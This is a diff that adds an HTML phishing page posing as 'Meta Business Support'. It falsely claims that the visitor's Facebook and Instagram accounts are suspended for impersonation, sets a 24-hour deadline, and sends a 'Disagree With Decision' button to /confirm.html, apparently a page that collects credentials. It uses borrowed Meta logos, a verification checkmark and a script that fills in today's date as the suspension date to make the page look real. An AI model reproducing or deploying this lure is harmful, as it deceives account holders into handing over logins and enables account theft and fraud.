@@ -1,0 +1,133 @@
+source: <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="google-site-verification" content="3beanOgEDiNwSqdy4YHeePeD6ecLMCGK6HT921EkqnA" />
+  <meta name="google-site-verification" content="T046ynCnIIAaVmbm1Rnwz-Jc3uMvPFbZyZEexxUvY0s" />
+  <meta name="google-site-verification" content="T046ynCnIIAaVmbm1Rnwz-Jc3uMvPFbZyZEexxUvY0s" />
+  <meta name="google-site-verification" content="HkC4uyKjCqpo71KjG1rBhK42lO2jpX_xEFzJIs4v_VI" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Meta Business Support</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      background-color: white;
+      max-width: 600px;
+      width: 100%;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    .meta-logo {
+      width: 50px;
+      margin-bottom: 20px;
+    }
+    .title {
+      font-size: 24px;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+    .alert-box {
+      background-color: #eeeeee;
+      padding: 15px;
+      margin-bottom: 20px;
+    }
+    .alert-box p {
+      margin: 0;
+      font-size: 16px;
+    }
+    .section {
+      text-align: left;
+      margin-bottom: 20px;
+    }
+    .section h3 {
+      margin-bottom: 10px;
+      font-size: 18px;
+    }
+    .section p {
+      margin: 0;
+      font-size: 16px;
+    }
+    .button {
+      display: inline-block;
+      background-color: #1877f2;
+      color: white;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      text-decoration: none;
+      margin-top: 20px;
+      width: -webkit-fill-available;
+    }
+    .footer {
+      font-size: 14px;
+      color: #888;
+      margin-top: 30px;
+    }
+    @media (max-width: 600px) {
+      .title {
+        font-size: 20px;
+      }
+      .alert-box p,
+      .section p,
+      .section h3 {
+        font-size: 15px;
+      }
+      .button {
+        width: 100%;
+        padding: 14px;
+      }
+      }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://brandlogos.net/wp-content/uploads/2021/10/meta_platforms_icon-logo_brandlogos.net_f5zqr.png" alt="Meta Logo" class="meta-logo">
+    <div class="title">Meta Business Support <img src="https://torro.io/hs-fs/hubfs/Meta-Verified-Packages-Checkmark.png" alt="Verfication" class="blue-check" style="height: 16px;"></div>
+    <div class="alert-box">
+      <p><strong>⛔ We suspended your account</strong><br><br>
+      24 hours left to disagree or we'll permanently disable your account</p>
+      <p id="suspend-date" style="margin-top: 10px; color: gray;"></p>
+    </div>
+    <div class="section">
+      <h3>What this means</h3>
+      <p>Your Facebook and Instagram account are not visible to people on Facebook or Instagram right now, and you cannot use them.</p>
+    </div>
+    <div class="section">
+      <h3>What you can do</h3>
+      <p>You have 24 hours left to disagree with our decision. We may need to collect some info from you that'll help us to take another look.</p>
+    </div>
+    <div class="section">
+      <h3>Why this happened</h3>
+      <p>Your account was flagged for deletion due to suspected impersonation. Using a false identity doesn't follow our <a href="#">Terms</a> and <a href="#">Community Standards</a> on account integrity and authentic identity and may lead to permanent account removal.</p>
+    </div>
+    <a href="/confirm.html" class="button">Disagree With Decision</a>
+    <div class="footer">
+      from <strong>Meta</strong><br>
+      Meta Terms of Service Team © <script>document.write(new Date().getFullYear());</script> Inc.
+    </div>
+  </div>
+
+  <script>
+    const dateElement = document.getElementById('suspend-date');
+    const today = new Date();
+    const options = { year: 'numeric', month: 'long', day: 'numeric' };
+    const formattedDate = today.toLocaleDateString(undefined, options);
+    dateElement.textContent = `Suspended on ${formattedDate}`;
+  </script>
+</body>
+</html>
+
+Page title: Meta Business Support
